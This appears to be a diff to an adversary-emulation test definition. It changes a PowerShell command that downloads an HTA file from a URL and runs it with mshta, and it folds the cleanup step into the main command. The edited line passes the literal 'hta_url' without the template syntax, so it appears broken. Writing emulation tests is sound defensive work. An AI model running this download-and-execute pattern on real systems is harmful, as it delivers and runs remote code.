@@ -66,9 +66,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      $var =Invoke-WebRequest "#{hta_url}"
-      $var.content|out-file "#{temp_file}"
+      (New-Object System.Net.WebClient).DownloadFile("hta_url", "#{temp_file}")
       mshta "#{temp_file}"
-    cleanup_command: |  
-      remove-item "#{temp_file}" 
+      remove-item "#{temp_file}"
 
